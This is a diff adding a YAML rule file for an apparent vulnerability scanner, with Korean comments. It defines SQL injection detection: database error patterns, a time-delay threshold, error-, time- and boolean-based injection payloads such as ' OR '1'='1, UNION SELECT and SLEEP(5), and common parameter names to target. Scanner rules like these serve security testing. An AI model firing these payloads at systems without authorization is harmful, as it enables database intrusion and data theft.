@@ -1,0 +1,58 @@
+meta:
+  name: 'SQL Injection'
+  version: '1.0'
+  extends: 'base.yaml'
+  severity: 'High'
+  reference: 'OWASP A03:2021'
+
+#탐지
+detection:
+  #취약 여부 판단용
+  error_patterns:
+    - 'you have an error in your sql syntax'
+    - 'warning: mysql'
+    - 'unclosed quotation mark'
+    - 'quoted string not properly terminated'
+    - 'sqlstate'
+    - 'ora-01756'
+    - 'microsoft ole db provider for sql server'
+    - 'pg_query'
+
+  #사간 지연 탐지
+  time_based_threshold: 5
+
+payloads:
+  error_based:
+    - "'"
+    - "''"
+    - "' OR '1'='1"
+    - "' OR '1'='1' --"
+    - "' OR '1'='1' /*"
+    - "') OR ('1'='1"
+    - "1' ORDER BY 1--"
+    - "1' ORDER BY 2--"
+    - "1' ORDER BY 3--"
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT NULL, NULL--"
+
+  time_based:
+    - "' AND SLEEP(5)--"
+    - "' AND SLEEP(5) AND '1'='1"
+    - "1; WAITFOR DELAY '0:0:5'--"
+
+  boolean_based:
+    - "' AND 1=1--"
+    - "' AND 1=2--"
+    - "' AND 'a'='a"
+    - "' AND 'a'='b"
+
+#파라미터 타겟팅
+target_params:
+  - 'id'
+  - 'user'
+  - 'username'
+  - 'search'
+  - 'q'
+  - 'page'
+  - 'item'
+  - 'category'
